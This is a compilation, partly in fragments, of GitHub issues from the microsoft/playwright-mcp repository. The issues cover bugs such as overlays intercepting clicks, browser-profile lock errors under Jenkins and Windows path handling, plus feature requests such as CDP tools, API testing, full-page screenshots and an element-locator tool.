The blocking element uses absolute inset-0 (full coverage of its parent/viewport), which MCP's accessibility-tree-based 定位 (via aria-ref) detects as intercepting pointer events.
MCP's browser_click retries but ultimately times out, as seen in logs showing:
<span ...> from <div class=""absolute inset-0"">…</div> subtree intercepts pointer events
Native XPath-based clicks bypass this issue, likely due to more flexible interaction logic (e.g., allowing force: true to skip overlay checks).

Reproduction:

Create a page with a target element (e.g., a button) and an overlay with absolute inset-0 covering it.
Use MCP's browser_click with the target's aria-ref → fails with timeout.
Use page.locator('xpath=//path/to/target').click({ force: true }) → succeeds.

Question:
Is there a way to configure MCP's browser_click to handle such overlay scenarios, similar to how native XPath clicks can bypass/interact through absolute inset-0 layers? Could a force parameter or alternative 定位 strategy be added to MCP tools to address this?

Related Context:

MCP relies on accessibility tree snapshots and aria-ref for 定位，which strictly validates element interactability (including overlay checks).
Native Playwright allows overriding this with force: true, but MCP's tools don't expose this option currently."

07:47:32   Error: Browser is already in use for C:\Users\vagrant\AppData\Local\ms-playwright\mcp-chrome-profile, use --isolated to run multiple instances of the same browser
Environment Details:
• OS: Windows Server (Jenkins agent environment)
• Execution Contexts:
• ✅ PyCharm (direct execution) → Works
• ❌ Jenkins Job (same machine) → Fails
• MCP Tool: @playwright/mcp@latest
• Profile Path: C:\Users\vagrant\AppData\Local\ms-playwright\mcp-chrome-profile
• Note: No other Playwright or MCP processes are active when the Jenkins job runs.

Expected Behavior:

Playwright MCP should be able to reuse the default persistent profile (mcp-chrome-profile) regardless of whether it’s invoked via Jenkins or PyCharm, as long as no other browser instance is actively using that profile.

Actual Behavior:

When launched via Jenkins, Playwright MCP incorrectly detects the profile as already in use, leading to a failure to start the browser.

Note: At time time of Jenkins job, no other playwright-mcp processes are running in the machine.

Bug Report: Avatar Menu Not Displaying in Playwright Chromium
Description:-
After logging into my web application, clicking on the avatar icon should display a dropdown menu. Instead, a dot loader appears, and the menu never shows up.

This issue only occurs when using Playwright's Chromium automation. It works fine when:

Interacting manually in the real browser (Chrome)

Running the same test in Playwright Firefox

This makes it difficult to reliably automate tests for post-login UI.

Works As Expected In:
1.Manual browser usage
2.Playwright Firefox

Fails In:
Playwright Chromium

</details>

This suggests that the path `C:\Program Files\Git\bin\bash.exe` might be incorrectly interpreted or passed as `Files\Git\bin\bash.exe`, likely due to quoting or escaping issues in shell path handling.

Thanks to https://github.com/microsoft/playwright-mcp/issues/752#issuecomment-3146493807 , I was able to get things mostly working. However, if this is something that can be fixed on the Playwright MCP side, it would help improve cross-platform installation consistency — or at least warrant a note for users running Claude Code on Windows.

That said, there’s a fair chance the issue may lie within Claude Code itself. Since Claude Code is not open-source at the moment, it’s difficult to determine the root cause. But if we can confirm that Playwright MCP is behaving correctly, that would give us a clearer path for follow-up and communication with the Claude team.

microsoft/playwright-mcp,3285686303,819,How to add custom tools while using with python based agentic frameworks like Strands-Agents SDK,closed,2025-08-02T07:18:21Z,2025-08-08T01:53:30Z,[],azaylamba,"I am trying playwright mcp with agentic frameworks like Strands-Agents SDK which is python based and has support for tools. The way I understood is the agentic framework gets access to all the playwright mcp tools and its own tools. The model then chooses the tools based on the task at hand.

Sometimes additional tools might be required for some operations on the web pages. e.g. Inspecting a table and retrieving data from complex table. We can easily add these kind of custom tools in the agentic framework.

How to make sure these custom tools are used while automating the browser using playwright mcp? Do we need to have the tools in a specific format or we can just add the tools and the framework will automatically identifies and use the tool? Is it even possible to use the custom tools in combination with playwright mcp tools?"

microsoft/playwright-mcp,3285023369,813,Feature Request: Add Chrome DevTools Protocol (CDP) tools for advanced browser automation,closed,2025-08-01T20:13:09Z,2025-08-01T23:49:34Z,[],dpost,"## Summary
I'm using playwright-mcp with cloud browser services (Bright Data) and need to send custom CDP commands to the same browser session that the standard MCP tools are using. Currently, there's no way to access the underlying CDP session from the MCP interface.

## Use Case
- **Environment**: Python client connecting via HTTP MCP transport
- **Browser Service**: Bright Data's browser API (cloud-based browsers)
- **Constraint**: Each CDP connection creates a new browser session, so I need to send CDP commands through the same connection that playwright-mcp is using
- **Goal**: Send custom CDP commands (like `Network.setUserAgentOverride`, `Runtime.evaluate` with advanced options) while maintaining the same browser session for standard MCP tools

## Proposed Solution
Add new MCP tools that expose CDP functionality:

### `playwright_cdp_send`
```json
{
  ""name"": ""playwright_cdp_send"",
  ""description"": ""Send Chrome DevTools Protocol command to current browser context"",
  ""inputSchema"": {
    ""type"": ""object"",
    ""properties"": {
      ""method"": {
        ""type"": ""string"",
        ""description"": ""CDP method name (e.g., 'Network.setUserAgentOverride')""
      },
      ""params"": {
        ""type"": ""object"", 
        ""description"": ""CDP method parameters""
      }
    },
    ""required"": [""method""]
  }
}
```

## Implementation Notes
- These tools would use the same browser context as existing tools
- Could leverage Playwright's existing CDP access: `await page.context().newCDPSession(page)`

## Benefits
- Enables advanced browser automation scenarios
- Maintains single browser session (critical for cloud browser services)
- Preserves existing MCP tool compatibility
- Opens up powerful CDP capabilities (network interception, performance monitoring, etc.)

## Questions
1. Would you be open to adding CDP tools as an optional capability?
2. Is there a better way to access the underlying browser context from external code?"

microsoft/playwright-mcp,3282227042,805,Claude MCP Playwright Plugin Fails on Windows Due to Path Handling Error,closed,2025-08-01T01:50:52Z,2025-08-01T18:36:43Z,[],kitadakyou,"## Description
The Playwright plugin for Claude MCP fails to run on a Windows environment. The issue appears to be related to how the plugin handles file paths, specifically the `bash.exe` path, leading to an incorrect file path format in the execution command.

## Steps to Reproduce
1.  On a Windows machine, install Git for Windows, ensuring `bash.exe` is present in the `C:\Program Files\Git\bin` directory and this path is added to the system's `PATH` environment variable.
2.  Install Node.js and the necessary Claude Code packages.
3.  Run the command to add the Playwright plugin to Claude MCP:
    ```bash
    claude mcp add playwright npx @playwright/mcp@latest
    ```
4.  Attempt to use the Playwright plugin with a Claude command (e.g., a command that invokes `/mcp`).

## Expected Behavior
The Playwright plugin should execute successfully, launching the Playwright process to perform the requested actions.

## Actual Behavior
Claude Code shows `playwright ✘ failed`, and the Claude Code logs show the following error message:

```json
{
  ""error"": ""Server stderr: /usr/bin/bash: Files\\Git\\bin\\bash.exe: No such file or directory"",
  ""timestamp"": ""2025-08-01T00:38:01.504Z"",
  ""sessionId"": ""5c14f280-8ef6-4368-9eee-b27cf381cea0"",
  ""cwd"": ""D:\\source\\repos\\my-repo""
}
```

The error message indicates that the plugin is attempting to use a Linux-style path (`/usr/bin/bash`) to locate a Windows-style executable, and it's also mishandling the Windows path, resulting in ""Files\Git"" instead of ""Program Files\Git"".

## Environment

- OS: Windows 11 24H2
- Shell: PowerShell
- Git for Windows: 2.50.0.windows.2
- Node.js: v22.17.0
- Claude Code:  1.0.65"

What is the correct package name for the MCP server?
Is there a specific command to start the MCP server that isn't documented?
Are there additional dependencies required beyond Playwright?
Is the MCP server available publicly or is it restricted to internal Microsoft use?"

https://github.com/microsoft/playwright-mcp/blob/65d99fe5957f368387d0f61362338917b2ce3391/src/httpServer.ts#L41-L42

When a server is configured to listen on 0.0.0.0 (for IPv4) or [::] (for IPv6), it binds to all available network interfaces on the host machine. This means it can accept connections originating from the local machine as well as from external machines on the same network.

In contrast, localhost is a hostname that resolves to the loopback interface (typically 127.0.0.1 for IPv4). A server listening specifically on localhost will only accept connections from the same machine.

Therefore, localhost is not the same as the IPv4 (0.0.0.0) or IPv6 ([::]) ""listen all"" addresses, because localhost implies a more restricted, local-only accessibility.  

This is especially annoying because when the hostname `localhost` _is_ supplied, the hosts resolver converts it to the IPv6 address of localhost, `[::1]`.

When executing an agent task using the mcp-use library and LangChain integration with Playwright MCP, the task runs successfully when executed directly via PyCharm. However, running the same task via a Jenkins job on the same machine consistently fails with the following error:

```

07:47:27 2025-07-29 07:47:27,102 - mcp_use - ERROR - Error parsing tool result: Tool execution failed: [TextContent(type='text', text='Error: Browser is already in use for C:\\Users\\vagrant\\AppData\\Local\\ms-playwright\\mcp-chrome-profile, use --isolated to run multiple instances of the same browser', annotations=None)]

07:47:32 ## Issue Encountered
07:47:32 
07:47:32 - The browser could not be started for automation due to this error:
07:47:32   ```
07:47:32   Error: Browser is already in use for C:\Users\vagrant\AppData\Local\ms-playwright\mcp-chrome-profile, use --isolated to run multiple instances of the same browser
```

**Environment Details:**
	•	OS: Windows Server (Jenkins agent environment)
	•	Execution Contexts:
	•	✅ PyCharm (direct execution) → Works
	•	❌ Jenkins Job (same machine) → Fails
	•	MCP Tool: @playwright/mcp@latest
	•	Profile Path: C:\Users\vagrant\AppData\Local\ms-playwright\mcp-chrome-profile
	•	Note: No other Playwright or MCP processes are active when the Jenkins job runs.

**Expected Behavior:**

Playwright MCP should be able to reuse the default persistent profile (mcp-chrome-profile) regardless of whether it’s invoked via Jenkins or PyCharm, as long as no other browser instance is actively using that profile.

**Actual Behavior:**

When launched via Jenkins, Playwright MCP incorrectly detects the profile as already in use, leading to a failure to start the browser.

Note: At time time of Jenkins job, no other playwright-mcp processes are running in the machine.

microsoft/playwright-mcp,3266836994,772,Standalone Playwright MCP Closes Suddenly on Long Loading Pages,closed,2025-07-27T07:41:12Z,2025-09-05T22:53:01Z,[],adiyansjah,"# Background
I have been working on integrating standalone `playwright-mcp` with GitHub Copilot and I have successfully running inside an LXC container.

The command I'm using to start the MCP server:
```bash
npx @playwright/mcp@v0.0.32 --port 8931 --host 0.0.0.0 --browser firefox --isolated --ignore-https-errors --user-data-dir ./data
```

Copilot is configured to use the MCP server like this:
```json
""playwright"": {
    ""url"": ""http://192.168.1.115:8931/mcp""
}
```

# Problem
When trying to open pages that take longer to load, the browser seems to close unexpectedly, and Copilot attempts to restart it, until it produces output `canceled`. For simple pages, it loads successfully, but it behaves inconsistently. it's like hit or miss and the issue appears frequently.

I discovered that this problem only occurs in version `v0.0.32`. It does not happen in `v0.0.31`. My assumption is there are changes in behavior related to the server connection.

I think this is related to this commit https://github.com/microsoft/playwright-mcp/commit/a9b9fb85dadfacf79ba4a4c557d1fc90dfeb6679, which sets a 5-second timeout.

# How to Reproduce

Version `v0.0.32`
1. I run exactly the same command as above.
2. Ask the copilot to open `detik.com` using playwright.

https://github.com/user-attachments/assets/bfc02e77-611f-4728-adcf-ae15a3e91ae6

Version `v0.0.31`
1. I run the command but with version `v0.0.31` with the same parameters.
2. Ask the copilot to open `detik.com` using playwright.

- Node.js version: 22
- I use Fluxbox and monitor it through VNC.

The Playwright MCP frequently fails with the error ""Browser is already in use for /Users/rjb/Library/Caches/ms-playwright/mcp-chrome-profile, use --isolated to run multiple instances of the same browser?"" This forces users to manually kill processes or clean up lock files before using Playwright.

## Current Behavior
When attempting to navigate to a URL, Playwright MCP throws an error if:
- A previous browser session didn't close properly
- Browser processes are still running in the background  
- Lock files remain in the profile directory
- Another MCP session is using the same profile

Users (agents) must manually:
1. Kill Playwright/Chrome processes with `pkill -f playwright` or `pkill -f chrome`
2. Remove lock files from the profile directory
3. Check for running Chrome processes using the profile

## Expected Behavior
Playwright MCP should automatically handle browser cleanup by intelligently distinguishing between active and abandoned browser instances, then taking appropriate action.

## Suggested Solution
Before launching a browser instance, Playwright MCP should:

### Smart Process Detection
- **Identify ""in use"" vs ""abandoned""**: Check if existing browser processes are actively receiving commands or have recent activity
- **Respect active sessions**: If another Claude Code/MCP session is actively using Playwright, don't interfere
- **Detect zombie processes**: Identify browser instances that are no longer connected to a parent MCP process

### Intelligent Cleanup Strategy
- **Clean up abandoned instances**: Gracefully terminate browser processes that have no active MCP parent
- **Preserve active sessions**: Leave running browsers that are currently being used by other sessions
- **Lock file validation**: Check if lock files correspond to actual running processes before removal

### Fallback Mechanisms
- **Auto-isolation**: If active browsers are detected, automatically use `--isolated` flag or unique profile paths
- **Profile generation**: Create session-specific profile directories to avoid conflicts entirely
- **Graceful degradation**: Fall back to headless mode or alternative profiles if cleanup isn't possible

### Session Management
- **Process tracking**: Maintain a registry of spawned browser instances for proper cleanup
- **Cleanup handlers**: Implement proper cleanup on MCP session termination
- **Health checks**: Periodically verify browser instance connectivity

This would eliminate manual process management while respecting legitimate concurrent Playwright usage across multiple Claude Code sessions."

Thank you for your valuable feedback on the Pull Request https://github.com/microsoft/playwright-mcp/pull/732. As instructed, I am formally submitting this feature request to outline the need for integrated API testing support within the Playwright MCP server.

We are  actively [pursuing a unified solution](https://www.npmjs.com/package/playwright-mcp-yaml-test) for test automation, leveraging AI for both UI and API testing. While Playwright MCP is our tool of choice for UI automation, we currently encounter challenges in extending this seamless approach to API testing, necessitating the use of separate solutions. This divergence introduces inefficiencies and complexities in our testing workflows.

To address this challenge and establish a truly unified testing experience, I respectfully request the integration of comprehensive API functionalities into Playwright MCP. This would include, but not be limited to, the following core capabilities:


- **Basic API Testing**: Support for standard HTTP methods (GET, POST, PUT, PATCH, DELETE).
- **Custom Headers/Authentication**: Robust handling of custom headers and various authentication mechanisms (e.g., Bearer tokens).
- **API Chaining**: The ability to execute multi-step API workflows, enabling scenarios such as dependent requests and token passing.
- **Complete Session Management**: Tools for managing API test sessions, including explicit or auto-generated session IDs, and querying session status.
- **Post-Testing Reporting**: Functionality to generate detailed reports (e.g., HTML) for API test sessions.

In an effort to contribute to this vision, I have [developed the complete working solution](https://github.com/uppadhyayraj/playwright-mcp/tree/feature/apiRequestSupport) by extending the Playwright MCP server with these capabilities. Main aim is to provide a uniform and streamlined approach for integrating API testing directly into Playwright MCP workflows for all users.

Request you to please help us in providing this capabilities or help in merging this feature if it aligns with your future vision. Looking forward to your response.

  ⎿  Error: Browser is already in use for /Users/tomwa/Library/Caches/ms-playwright/mcp-chrome-profile, use --isolated to run multiple instances of the same browser
  ⎿  Interrupted by user
```

I believe this might be because playwright MCP seemingly uses one browser context, while the [playwright docs](https://playwright.dev/docs/browser-contexts) talk about creating multiple browser contexts.

```
const { chromium } = require('playwright');

// Create a Chromium browser instance
const browser = await chromium.launch();

// Create two isolated browser contexts
const userContext = await browser.newContext();
const adminContext = await browser.newContext();

// Create pages and interact with contexts independently
const adminPage = await adminContext.newPage();
const userPage = await userContext.newPage();
```

Is my theory correct? Anyone want to work on an MR to allow multiple concurrent playwright MCP browser contexts to run? Off the top of my head, the way I would approach this is by adding a new browser context every single time I spawn an MCP tool call in a different Claude context. But I'm sure someone can tell me why that's dumb and that there's a better way to do this as well

Edit: Nevermind it looks like I am wrong but I am still going to create and then close this issue because then claude code can find it more easily in the future when others try to solve this problem.

```
export function contextFactory(browserConfig: FullConfig['browser']): BrowserContextFactory {
  if (browserConfig.remoteEndpoint)
    return new RemoteContextFactory(browserConfig);
  if (browserConfig.cdpEndpoint)
    return new CdpContextFactory(browserConfig);
  if (browserConfig.isolated)

  return new PersistentContextFactory(browserConfig);

if (params.time) {

Introduce a new input parameter (e.g., maxTime or maxWait) to control the upper limit.

Update the logic to use this new parameter, falling back to the current default if none is provided.

Example:

const maxWait = params.maxWait ? params.maxWait * 1000 : 10000;

You need to double click to navigate directories or open files. Single click merely selects the directory or file. A workaround is to select a directory or file with a single click and then press the enter key to open it.

For sites like [OneDrive](https://onedrive.live.com/), it depends on where you single click. Single clicking a directory or file name acts as opening but if you single click off to the side, it only selects the row. Double clicking the row acts as opening.

It is somewhat niche but I think Google Drive is a good example. With that established perhaps the discussion is more about whether it is worth the trade-off given the desired to avoid [context confusion](https://www.dbreunig.com/2025/06/22/how-contexts-fail-and-how-to-fix-them.html#context-confusion) as @pavelfeldman seemed to previously suggest:

But if a new window is opened in the app by its functionality, not with `browser_tab_new`, calling `browser_tab_list` again returns the old tab list, without the new one. However, if I disconnect and reconnect the mcp server, the new tab appears in tabs list. 
Another interesting detail: if I **close** en existing window in the same scenario, it disappears from `browser_tab_list` output immediately. So it doesn't seem like the tool isn't updating tabs list in real time, it has an issue just with adding new tabs."

I'm migrating an application from Vue.js to React while maintaining identical functionality and UI appearance. To ensure pixel-perfect migration, I need to compare full-page screenshots between the two implementations to identify and fix any visual differences.

## Current Limitation

The current `browser_take_screenshot` tool only captures the viewport by default. For comprehensive visual comparison during framework migration, I need the ability to capture full-page screenshots to compare complete page layouts, long scrollable content.
## Use Case

**Migration Workflow:**
1. Take full-page screenshot of Vue.js implementation
2. Take full-page screenshot of React implementation  
3. Use AI to compare images and identify differences
4. Fix identified issues and repeat"

My goal is to launch the MCP server as a separate process or service, and have my API send requests and receive responses, just like any client would do.
My specific questions are:
What is the recommended way to run the MCP server as a service that can be accessed by my API (e.g., running it as a child process, using sockets, etc.)?
Should I use the same configuration as clients like Visual Studio Code, or is there a best practice for integrating it into a web API?
Does anyone know of any examples, tutorials, or community projects that have done something similar (exposing MCP through a REST API, WebSocket, etc.)?

Many agents get confused by the naming of the Playwright MCP tools, and, when instructed to use Playwright MCP to do something, end up installing Playwright and making Playwright scripts to do that thing. I add rules and instructions but it still happens occasionally, due to models' natural tendency to conflate novel text (Playwright MCP) with topics they know well (Playwright).

I've seen this behavior from both Claude Sonnet 4 and Gemini 2.5 Pro, in Claude Code, Cursor, and Gemini CLI.

The obvious attempts to avoid this:
- In the rules file, give instructions like ""never use the Playwright framework, whenever Playwright MCP is mentioned use the mcp tools including mcp_playwright__browser... etc""
- Instead of saying ""test with Playwright MCP"", say ""use Playwright MCP to take the app for a spin"" or ""use Playwright MCP to navigate to the app and take a snapshot""
These help, but 

I'm currently exploring using deny/disallow rule configs in Claude Code and Gemini CLI but this feels like more of a poweruser thing that shouldn't be necessary.

What could a fix look like? Well, you wouldn't even have to change the name of this project!! The only thing that matters is what the mcp is called to the tool. So if the tool calls were all based on ""pwmpc"" (for example), and the user gave an instruction to ""test using pwmpc"", the model couldn't get the wrong idea like it does now.

This is the ONLY thing I can think of that would make Playwright MCP work better. The snapshot and screenshot capabilities are miles ahead of alternatives, thanks for building it!"

<body>
<!--StartFragment--><html><head></head><body><h1>Feature Request: Add Element Locator Tool for aria-ref to ref Mapping</h1>
<h2>🎯 Feature Summary</h2>
<p>Add a new tool that allows querying elements using <strong>aria-ref</strong> attributes within captured PageSnapshots and returns the corresponding MCP internal <code>ref</code> identifier along with traditional CSS and XPath selectors for enhanced automation workflows.</p>
<h2>🔍 Background &amp; Context</h2>
<p>Currently, the Playwright MCP workflow requires:</p>
<ol>
<li>Call <code>browser_snapshot</code> to get accessibility snapshot</li>
<li>Manually identify the target element's <code>ref</code> from the snapshot</li>
<li>Use the <code>ref</code> parameter in interaction tools like <code>browser_click</code>, <code>browser_type</code>, etc.</li>
</ol>
<p>The server enables LLMs to interact with web pages through structured accessibility snapshots, and all interaction tools require a <code>ref</code> parameter which is the ""Exact target element reference from the page snapshot"".</p>
<p>However, there's currently no programmatic way to locate elements by HTML attributes (like <code>aria-ref</code>) and retrieve their corresponding MCP <code>ref</code> identifier.</p>
<h2>🛠️ Proposed Tool</h2>
<h3>Tool Name: <code>browser_find_element</code></h3>
<h3>Description</h3>
<p>Locate elements within the current PageSnapshot using various attribute-based selectors and return their MCP <code>ref</code> identifiers along with standard CSS/XPath selectors.</p>
<h3>Parameters</h3>
<pre><code class=""language-typescript"">{
  // Query parameters (at least one required)
  ""aria_ref""?: string,           // aria-ref attribute value
  ""data_testid""?: string,        // data-testid attribute value  
  ""id""?: string,                 // HTML id attribute
  ""css_selector""?: string,       // CSS selector
  
  // Options
  ""include_selectors""?: boolean, // Include CSS/XPath (default: true)
  ""multiple""?: boolean          // Return all matches vs first match (default: false)
}
</code></pre>
<h3>Expected Response</h3>
<pre><code class=""language-json"">{
  ""found"": true,
  ""elements"": [
    {
      ""ref"": ""node-123"",  // MCP internal reference for use with other tools
      ""element_info"": {
        ""role"": ""button"",
        ""name"": ""Submit Form"", 
        ""tag"": ""button"",
        ""attributes"": {
          ""aria-ref"": ""submit-btn"",
          ""class"": ""btn btn-primary""
        }
      },
      ""selectors"": {
        ""css_path"": ""form.main-form button[aria-ref='submit-btn']"",

      }
    }
  ],
  ""total_found"": 1
}
</code></pre>
<h2>🎯 Use Cases &amp; Integration</h2>
<h3>1. <strong>Streamlined Automation Workflow</strong></h3>
<pre><code class=""language-javascript"">// Before (current workflow)
const snapshot = await browser_snapshot();
// Manual inspection needed to find ref for aria-ref=""submit""
const clickResult = await browser_click({
  element: ""Submit button"",
  ref: ""node-123"" // Had to manually identify this
});

// After (with new tool)
const findResult = await browser_find_element({
  aria_ref: ""submit""
});
const clickResult = await browser_click({
  element: ""Submit button"", 
  ref: findResult.elements[0].ref // Programmatically obtained
});
</code></pre>
<h3>2. <strong>Enhanced Test Automation</strong></h3>
<ul>
<li>Generate stable selectors for CI/CD pipelines</li>
<li>Bridge gap between accessibility-first development and automation</li>
<li>Support for multiple selector strategies in one tool</li>
</ul>
<h3>3. <strong>Debugging &amp; Development Support</strong></h3>
<ul>
<li>Quick element identification during development</li>
<li>Validation of accessibility attributes</li>
<li>Cross-reference between MCP refs and standard selectors</li>
</ul>
<h2>🏗️ Technical Implementation Considerations</h2>
<h3>Integration with Existing Architecture</h3>
<ul>
<li><strong>Leverage Current PageSnapshot</strong>: Build upon existing <code>browser_snapshot</code> infrastructure</li>
<li><strong>Maintain Consistency</strong>: Follow same response patterns as other MCP tools</li>
<li><strong>Performance</strong>: Cache snapshot data to avoid redundant accessibility tree traversals</li>
</ul>
<h3>Selector Generation Strategy</h3>
<p>Based on Playwright's accessibility tree structure that contains information about elements, their roles, names, values, and relationships:</p>
<pre><code class=""language-javascript"">function generateSelectors(element) {
  return {
    css_path: buildCSSPath(element),     // Hierarchical CSS selector
    xpath: buildXPath(element),          // XPath expression
    css_nth: buildNthChildCSS(element)   // Nth-child based selector
  };
}
</code></pre>
<h3>Error Handling</h3>
<ul>
<li>Handle cases where attributes are not found</li>
<li>Support partial matching for dynamic content</li>
<li>Graceful degradation when selector generation fails</li>
</ul>
<h2>🔄 Compatibility with Current MCP Tools</h2>
<p>The new tool integrates seamlessly with the existing tool ecosystem:</p>

Current Tool | Integration Benefit
-- | --
browser_snapshot | Uses same accessibility data source
browser_click | Provides ref parameter directly
browser_type | Enables attribute-based form field targeting
browser_hover | Supports accessible element hover actions
browser_drag | Facilitates drag-and-drop with accessible elements


<h2>📋 Acceptance Criteria</h2>
<ul>
<li>[ ] Successfully locate elements by <code>aria-ref</code>, <code>data-testid</code>, <code>id</code>, and CSS selectors</li>

</html># Feature Request: Add Element Locator Tool for aria-ref to ref Mapping

## 🎯 Feature Summary

Add a new tool that allows querying elements using **aria-ref** attributes within captured PageSnapshots and returns the corresponding MCP internal `ref` identifier along with traditional CSS and XPath selectors for enhanced automation workflows.

## 🔍 Background & Context

Currently, the Playwright MCP workflow requires:
1. Call `browser_snapshot` to get accessibility snapshot
2. Manually identify the target element's `ref` from the snapshot 
3. Use the `ref` parameter in interaction tools like `browser_click`, `browser_type`, etc.

The server enables LLMs to interact with web pages through structured accessibility snapshots, and all interaction tools require a `ref` parameter which is the ""Exact target element reference from the page snapshot"".

However, there's currently no programmatic way to locate elements by HTML attributes (like `aria-ref`) and retrieve their corresponding MCP `ref` identifier.

## 🛠️ Proposed Tool

### Tool Name: `browser_find_element`

### Description
Locate elements within the current PageSnapshot using various attribute-based selectors and return their MCP `ref` identifiers along with standard CSS/XPath selectors.

### Parameters
```typescript
{
  // Query parameters (at least one required)
  ""aria_ref""?: string,           // aria-ref attribute value
  ""data_testid""?: string,        // data-testid attribute value  
  ""id""?: string,                 // HTML id attribute
  ""css_selector""?: string,       // CSS selector
  
  // Options
  ""include_selectors""?: boolean, // Include CSS/XPath (default: true)
  ""multiple""?: boolean          // Return all matches vs first match (default: false)
}
```

### Expected Response
```json
{
  ""found"": true,
  ""elements"": [
    {
      ""ref"": ""node-123"",  // MCP internal reference for use with other tools
      ""element_info"": {
        ""role"": ""button"",
        ""name"": ""Submit Form"", 
        ""tag"": ""button"",
        ""attributes"": {
          ""aria-ref"": ""submit-btn"",
          ""class"": ""btn btn-primary""
        }
      },
      ""selectors"": {
        ""css_path"": ""form.main-form button[aria-ref='submit-btn']"",
        ""xpath"": ""//form[@class='main-form']//button[@aria-ref='submit-btn']"",
        ""css_nth"": ""form.main-form button:nth-child(2)""
      }
    }
  ],
  ""total_found"": 1
}
```

## 🎯 Use Cases & Integration

### 1. **Streamlined Automation Workflow**
```javascript
// Before (current workflow)
const snapshot = await browser_snapshot();
// Manual inspection needed to find ref for aria-ref=""submit""
const clickResult = await browser_click({
  element: ""Submit button"",
  ref: ""node-123"" // Had to manually identify this
});

// After (with new tool)
const findResult = await browser_find_element({
  aria_ref: ""submit""
});
const clickResult = await browser_click({
  element: ""Submit button"", 
  ref: findResult.elements[0].ref // Programmatically obtained
});
```

### 2. **Enhanced Test Automation**
- Generate stable selectors for CI/CD pipelines
- Bridge gap between accessibility-first development and automation
- Support for multiple selector strategies in one tool

### 3. **Debugging & Development Support**
- Quick element identification during development
- Validation of accessibility attributes
- Cross-reference between MCP refs and standard selectors

## 🏗️ Technical Implementation Considerations

### Integration with Existing Architecture
- **Leverage Current PageSnapshot**: Build upon existing `browser_snapshot` infrastructure
- **Maintain Consistency**: Follow same response patterns as other MCP tools
- **Performance**: Cache snapshot data to avoid redundant accessibility tree traversals

### Selector Generation Strategy
Based on Playwright's accessibility tree structure that contains information about elements, their roles, names, values, and relationships:

```javascript
function generateSelectors(element) {
  return {
    css_path: buildCSSPath(element),     // Hierarchical CSS selector
    xpath: buildXPath(element),          // XPath expression
    css_nth: buildNthChildCSS(element)   // Nth-child based selector
  };
}
```

### Error Handling
- Handle cases where attributes are not found
- Support partial matching for dynamic content
- Graceful degradation when selector generation fails

## 🔄 Compatibility with Current MCP Tools

The new tool integrates seamlessly with the existing tool ecosystem:

| Current Tool | Integration Benefit |
|--------------|-------------------|
| `browser_snapshot` | Uses same accessibility data source |
| `browser_click` | Provides `ref` parameter directly |
| `browser_type` | Enables attribute-based form field targeting |
| `browser_hover` | Supports accessible element hover actions |
| `browser_drag` | Facilitates drag-and-drop with accessible elements |

## 📋 Acceptance Criteria

- [ ] Successfully locate elements by `aria-ref`, `data-testid`, `id`, and CSS selectors
- [ ] Return valid MCP `ref` identifiers compatible with existing interaction tools
- [ ] Generate stable and unique CSS Path and XPath selectors
- [ ] Handle multiple matches with configurable return behavior
- [ ] Maintain performance with large PageSnapshots (>1000 elements)
- [ ] Provide comprehensive error messages for debugging
- [ ] Include accessibility metadata in responses
- [ ] Follow existing MCP tool parameter and response patterns

## 🚀 Future Enhancement Opportunities

### Phase 2 Features
- **Fuzzy Matching**: Support approximate text matching for accessible names
- **Selector Validation**: Verify generated selectors against live page state  
- **Batch Operations**: Find multiple elements in single tool call
- **Performance Metrics**: Include selector generation timing in responses

### Integration Possibilities
- **Test Generation**: Auto-generate Playwright test code using returned selectors
- **Page Object Models**: Support structured element mapping for large applications
- **Accessibility Auditing**: Identify elements missing required accessibility attributes

microsoft/playwright-mcp,3164397680,586,Playwright MCP cannot interact with modal overlay elements - clicks are intercepted,closed,2025-06-20T21:19:05Z,2025-06-23T08:05:17Z,[],praseetht,"**Summary**
When attempting to interact with elements that are behind or adjacent to modal overlays (such as Fluent UI Panels), Playwright MCP fails to execute clicks due to overlay elements intercepting pointer events. This prevents automation of common UI patterns involving modal dialogs, panels, and overlays.

**Environment**

- Playwright MCP Version: @playwright/mcp@0.0.29
- Browser: Chromium/Chrome (likely affects all browsers)
- OS: Windows
- Test Site: Microsoft Fluent UI documentation https://developer.microsoft.com/en-us/fluentui#/controls/web/panel
 

Steps to Reproduce

- Navigate to a page with modal overlays (e.g., Fluent UI Panel examples)
- Open a modal panel using the first available button
- Playwright cannot detect that Panel is open (screenshot below from GH Copilot Agent Chat (Claude Sonnet 4)) 

![Image](https://github.com/user-attachments/assets/0492b335-9eff-4075-831a-4aa4be9f2038)

**Workarounds Attempted**

- Waiting for animations/transitions to complete
- Multiple retry attempts
- Different timing strategies
- None of these workarounds resolve the fundamental overlay interception issue.

**Additional Context**
This appears to be related to how Playwright MCP translates accessibility snapshots to actual DOM interactions. The accessibility tree might show elements as clickable and correctly identifies modal dialogs with their ""dialog"" role, but the actual DOM implementation has overlay elements that prevent interaction with elements outside the modal scope.

**Accessibility Tree View after clicking Open Panel**

microsoft/playwright-mcp,3164178098,585,@playwright/mcp server fails to load tools in Cursor due to importAssertions warning,closed,2025-06-20T19:12:54Z,2025-07-07T23:06:03Z,[],Colton-wq,"**Describe the bug**
When setting up the `@playwright/mcp` server in Cursor on Windows, the server shows a ""green light"" indicating a successful connection. However, none of the Playwright tools (e.g., `browser_navigate`) become available. The Cursor extension host console shows the following warning, which appears to be the root cause of the silent failure:
`(node:...) ExperimentalWarning: Use 'importAttributes' instead of 'importAssertions'`

This suggests the package or its dependencies are using an outdated syntax for import statements, which prevents the server from fully initializing, despite the process starting successfully.

**To Reproduce**
1.  Set up the following configuration in `mcp.json` on a Windows machine with a recent version of Cursor.
2.  Restart Cursor.
3.  Observe the green light for the Playwright MCP server.
4.  Attempt to call any Playwright tool, such as `playwright_browser_navigate`. The call will fail with ""Tool not found"".
5.  Check the Cursor developer console (`Help > Toggle Developer Tools > Console`). The `importAssertions` warning will be present.

**`mcp.json` Configuration:**
```json
{
  ""playwright"": {
    ""command"": ""cmd"",
    ""args"": [
      ""/c"",
      ""npx"",
      ""@playwright/mcp@latest""
    ]
  }
}
```

**Expected behavior**
The Playwright tools should be loaded and available for use in Cursor.

**Key console error:**
```
[Extension Host] (node:...) ExperimentalWarning: Use `importAttributes` instead of `importAssertions`
(Use `Cursor --trace-warnings ...` to show where the warning was created)
```

**Desktop Environment:**
*   OS: Windows 11

**Additional context**
Extensive troubleshooting has been performed, none of which resolved the issue:
*   Switched the `npm` registry to a reliable mirror (`https://registry.npmmirror.com`).
*   Initialized a full `npm` project (`npm init -y`, `npm install @playwright/test`).
*   Installed Playwright browsers (`npx playwright install`).
*   Cleared the `npm` cache (`npm cache clean --force`).

